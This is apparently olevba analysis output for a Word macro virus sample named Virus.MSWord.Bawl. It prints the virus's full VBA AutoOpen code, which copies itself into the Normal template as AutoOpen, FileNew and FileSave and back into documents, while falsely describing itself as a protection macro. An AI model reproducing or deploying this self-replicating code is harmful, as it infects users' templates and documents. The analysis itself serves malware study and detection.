olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bawl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bawl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Bawl - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Victory is ours. Created by Cheezhed

On Error GoTo -1: On Error GoTo ErrorHandler

     WordBasic.FileSummaryInfo Subject:="Green Bay Packers -- Super Bowl XXXI Champions"

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:FileNew"
     WordBasic.MacroCopy MacName$, "Global:FileSave"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo FileNewHandler
     MacName$ = FName$ + ":FileNew"
     WordBasic.MacroCopy "Global:FileNew", MacName$
FileNewHandler:

On Error GoTo -1: On Error GoTo FileSaveHandler
     MacName$ = FName$ + ":FileSave"
     WordBasic.MacroCopy "Global:FileSave", MacName$
FileSaveHandler:
    
Rem Go Pack Go!

EndCode:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

